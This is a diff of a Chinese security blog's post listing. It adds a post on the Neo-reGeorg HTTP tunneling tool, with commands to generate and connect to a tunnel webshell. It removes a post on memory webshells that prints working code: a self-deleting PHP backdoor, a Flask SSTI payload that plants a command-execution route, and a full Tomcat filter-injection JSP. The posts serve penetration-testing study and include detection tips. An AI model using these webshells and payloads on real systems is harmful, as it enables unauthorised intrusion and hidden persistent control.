@@ -255,6 +255,87 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/12/31/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%B9%8BNeo-reGeorg/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/31/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%B9%8BNeo-reGeorg/" class="post-title-link" itemprop="url">内网隧道之Neo-reGeorg</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-31 14:47:37 / 修改时间：14:48:24" itemprop="dateCreated datePublished" datetime="2022-12-31T14:47:37+08:00">2022-12-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tools/" itemprop="url" rel="index"><span itemprop="name">-tools</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="内网隧道之Neo-reGeorg"><a href="#内网隧道之Neo-reGeorg" class="headerlink" title="内网隧道之Neo-reGeorg"></a>内网隧道之Neo-reGeorg</h1><p>本文介绍一个HTTP隧道的工具,Neo-reGeorg。</p>
+<p>是2020年的一个工具，基于python，也是比较新的一款工具了，在各大渗透人员中也广为使用。</p>
+<p>所谓http隧道，就是通过上传特定脚本到网站目录进行解析，配合本地工具即可搭建隧道的方式，这种方式同样可以直达内网，这种方式复用了网站的端口，无需再开新的端口和担忧防火墙规则对流量的拦截。（我们常用的各种webshell管理工具，如冰蝎等也是可以建立http隧道的。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>工具原理也简单，就是将socket通道包裹在http协议中。</p>
+<p><img src="/2022/12/31/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%B9%8BNeo-reGeorg/image-20221231141432915.png" alt="image-20221231141432915"></p>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">生成webshell</span><br><span class="line">python3 neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">连接webshell</span><br><span class="line">python3 neoreg.py -k password -u http://xx/tunnel.php</span><br><span class="line"></span><br><span class="line">伪装404</span><br><span class="line">python neoreg.py generate -k &lt;you_password&gt; --file 404.html --httpcode 404</span><br><span class="line"></span><br><span class="line">如需 Authorization 认证和定制的 Header 或 Cookie</span><br><span class="line">$ python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; -H &#x27;Authorization: cm9vdDppcyB0d2VsdmU=&#x27; --cookie &quot;key=value;key2=value2&quot;</span><br><span class="line"></span><br><span class="line">需要分散请求，可上传到多个路径上，如内存马</span><br><span class="line">python neoreg.py -k &lt;you_password&gt; -u &lt;url_1&gt; -u &lt;url_2&gt; -u &lt;url_3&gt; ...</span><br><span class="line"></span><br><span class="line">使用端口转发功能，非启动 socks5 服务 ( 127.0.0.1:1080 -&gt; ip:port )</span><br><span class="line">python neoreg.py -k &lt;you_password&gt; -u &lt;url&gt; -t &lt;ip:port&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-k：主要影响webshell文件中的随机字符串，主要位置在headers的键值。</span><br><span class="line">-f：主要影响webshell文件最后位置，exit函数运行结束后打印的html代码。</span><br><span class="line">-c：主要影响webshell文件设定的响应状态码。</span><br></pre></td></tr></table></figure>
+
+<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p><code>python3 neoreg.py generate -k 123456</code></p>
+<p>先创建webshell</p>
+<p><code>python3 neoreg.py -k 123456 -u http://192.168.52.1/1.php</code></p>
+<p>随后链接webshell</p>
+<p><img src="/2022/12/31/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%B9%8BNeo-reGeorg/image-20221231144336130.png" alt="image-20221231144336130"></p>
+<p>然后就可以通过proxychains来利用socks代理了</p>
+<p>后续可能会分析源码，webshell等。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -510,117 +591,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">初探内存马</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-12-25 21:34:19 / 修改时间：21:35:30" itemprop="dateCreated datePublished" datetime="2022-12-25T21:34:19+08:00">2022-12-25</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="初探内存马"><a href="#初探内存马" class="headerlink" title="初探内存马"></a>初探内存马</h1><p>通过此文理解内存马，掌握内存马的基本原理以及一些基本分类，和一些基础知识，有助于后面我们的各种技术研究。</p>
-<p> 内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器，不容易清除。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">大概原理：</span><br><span class="line">是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/1662006657_63103581f3f1446ecb7e9.png" alt="img"></p>
-<p>以上是内存马的相关分类</p>
-<p>下面基本介绍一下各种内存马。</p>
-<h1 id="各种内存马"><a href="#各种内存马" class="headerlink" title="各种内存马"></a>各种内存马</h1><h2 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h2><p>php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。</p>
-<p><strong>检测思路</strong></p>
-<p>1.检查所有php进程处理请求的持续时间</p>
-<p>2.检测执行文件是否在文件系统真实存在</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。</span></span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//unlink(__FILE__)函数：删除文件。</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = ‘<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;zzz&quot;</span>]) <span class="meta">?&gt;</span>’;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">//file_put_contents函数：将一个字符串写入文件。</span></span><br><span class="line">usleep(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//看看最基础的代码嗯就是不断的将一句话木马传入22.php文件中去。</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>如何处置</strong></p>
-<p>对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。</p>
-<p>其实也简单，可以写一个条件竞争的文件来克制不死马，其中必须将usleep改为小雨php不死马的参数。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = ‘<span class="number">2222</span>’;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="python内存马"><a href="#python内存马" class="headerlink" title="python内存马"></a>python内存马</h2><p>Python内存马利用flask框架中ssti注入来实现，flask框架中在web应用模板渲染的过程中用到render_template_string()进行渲染但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码实例</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    content = request.args.get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/index?=content%7B%7Ba.__init__.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D(%22app.add_url_rule(%27/shell1%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,%7B%27_request_ctx_stack%27:url_for.__globals__%5B%27_request_ctx_stack%27%5D,%27app%27:url_for.__globals__%5B%27current_app%27%5D%7D)%7D%7D</span><br></pre></td></tr></table></figure>
-
-<p>这就是payload，解一下url编码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/index?=content&#123;&#123;a.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell1&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>手续看是写入了一个shell1的路由，一旦访问这个路由就会执行whoami命令。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__class__:返回调用的参数类型</span><br><span class="line"></span><br><span class="line">__bases__:返回基类列表</span><br><span class="line"></span><br><span class="line">__builtins__:内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等</span><br><span class="line"></span><br><span class="line">__globals__：以字典的形式返回函数所在的全局命名空间所定义的全局变量,这里的函数可以是类class的构造函数如__init__,也可以是flask的函数如url_for等。</span><br><span class="line"></span><br><span class="line">add_url_rule注册了一个/shell的路由，__init__相当于构造函数，定义自己的属性，通过__init__.__globals__得到他们的命名空间从而得到builtins就可以执行内置函数如eval, exec, open等。</span><br></pre></td></tr></table></figure>
-
-<p><strong>检测思路</strong></p>
-<p>1.查看所有内建模块中是否包含eval、exec等可以执行代码的函数如：class ‘warnings.catch_warnings’、class ‘site.Quitter’等。</p>
-<p>2.检测self.add_url_rule()中特殊名字的路由如shell等。</p>
-<h2 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h2><p>在内存马家族中，最多也最常见的就是java类别的，后续我会补充各种类型的内存马，通过代码，流量，逐步进行分析。</p>
-<p><strong>fillter型内存马</strong><br> Filter：FIlter为过滤器可以对用户的一些请求进行拦截修改等操作。当web.xml中注册了一个Filter来对某个 Servlet 程序进行拦截处理时该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。filter型内存马是将命令执行的文件通过动态注册成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">filter检测思路：</span><br><span class="line"></span><br><span class="line">带有特殊含义的filter的名字比如shell等。</span><br><span class="line"></span><br><span class="line">Filter的优先级，filter内存马需要将filter调至最高</span><br><span class="line"></span><br><span class="line">查看web.xml中有没有filter配置</span><br><span class="line"></span><br><span class="line">检测特殊的classloader</span><br><span class="line"></span><br><span class="line">检测classloader路径下没有class文件</span><br><span class="line"></span><br><span class="line">检测Filter中的doFilter方法是否有恶意代码</span><br></pre></td></tr></table></figure>
-
-<p>filter内存马实战：</p>
-<p> 这里我们将公开的filter类型的内存马文件直接上传到tomcat网站下，访问内存马后就植入成功了，植入成功后在删掉相对的jsp文件也不会影响内存马的运行，但是重启tomcat服务器后内存马即失效。注入成功后在路径后加入?cmd=后跟命令即可。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;!-- page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span></span><br><span class="line">page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> --&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">String cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (cmd!= <span class="keyword">null</span>) &#123;</span><br><span class="line">Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line"><span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">servletResponse.getOutputStream().flush();</span><br><span class="line">servletResponse.getOutputStream().close();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">String name = <span class="string">&quot;filterDemo&quot;</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line">filterDemo filter = <span class="keyword">new</span> filterDemo();</span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//添加filterDef</span></span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line">FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line"><span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/zzz&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">filterConfigs.put(name,filterConfig);</span><br><span class="line">out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">out.write(<span class="string">&quot;Injected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
